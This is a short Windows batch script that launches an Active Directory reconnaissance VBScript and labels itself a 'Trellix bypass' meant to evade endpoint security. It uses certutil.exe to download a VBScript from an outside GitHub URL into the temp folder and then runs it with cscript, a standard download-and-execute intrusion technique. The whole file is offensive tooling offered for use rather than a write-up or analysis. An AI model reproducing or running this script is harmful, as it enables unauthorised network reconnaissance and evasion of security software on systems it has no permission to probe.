@echo off
REM ===============================================
REM run_via_vbs.bat - Launch VBScript recon via cscript
REM Output: %TEMP%\ad_recon_vbs.log
REM ===============================================

set "OUT=%TEMP%"

echo.
echo === AD RECON via VBScript (Trellix bypass) ===
echo Output: %OUT%\ad_recon_vbs.log
echo.

certutil.exe -urlcache -split -f "https://raw.githubusercontent.com/Sunz01/oscheat/master/win-tap/run_via_vbs.vbs" "%OUT%\ad_recon.vbs" > nul 2>&1

if not exist "%OUT%\ad_recon.vbs" (
    echo [ERROR] Download failed. Trying local...
    if exist "%~dp0run_via_vbs.vbs" (
        copy /Y "%~dp0run_via_vbs.vbs" "%OUT%\ad_recon.vbs" > nul
    )
)

if exist "%OUT%\ad_recon.vbs" (
    cscript.exe //NoLogo "%OUT%\ad_recon.vbs" 2>&1
) else (
    echo [ERROR] No VBS script available
)

echo.
echo ============================================
echo Done. Log at: %OUT%\ad_recon_vbs.log
echo ============================================
if exist "%OUT%\ad_recon_vbs.log" type "%OUT%\ad_recon_vbs.log"
pause
